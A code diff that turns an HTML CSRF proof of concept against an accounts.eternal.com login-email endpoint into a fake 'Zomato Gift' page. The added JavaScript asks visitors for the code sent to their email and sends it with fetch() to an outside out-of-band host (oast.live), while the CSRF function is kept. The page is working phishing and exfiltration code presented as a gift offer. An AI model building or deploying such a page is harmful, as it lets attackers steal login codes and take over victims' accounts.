@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>CSRF PoC (JS-built form) - accounts.eternal.com /login/email</title>
+  <title>Zomato Gift</title>
 </head>
 <body>
  <h1 style="text-align:center;">you got gift from zomato</h1>
@@ -10,14 +10,34 @@
  <iframe name="hiddenFrame" style="display:none;"></iframe>
 
   <script>
-    function createInput() {
+  function createInput() {
       const h_satu = document.createElement("h1");
-      h_satu.textContent="Please enter the code sent to your email";
+      h_satu.textContent = "Please enter the code sent to your email";
       const input = document.createElement("input");
       input.type = "number";
       input.name = "angka";
-      document.body.appendChild(h_satu,input);
+      const button = document.createElement("button");
+      button.type = "submit";
+      button.textContent = "Submit";
+      button.setAttribute("onclick", "kirim()");
+      document.body.appendChild(h_satu);
+      document.body.appendChild(input);
+      document.body.appendChild(button);
+  }
+function kirim() {
+  const input = document.querySelector('input[name="angka"]');
+  const hasil = input.value;
+
+  fetch("https://davrormie68sku47sk9gqqpuj5p34diwp.oast.live?hasil=" + encodeURIComponent(hasil))
+    .then(response => response.text())
+    .then(data => {
+      console.log("Response:", data);
+    })
+    .catch(error => {
+      console.error("Error:", error);
+    });
 }
+
 
     function csrfPoc() {
       var targetUrl = "https://accounts.eternal.com/login/email";
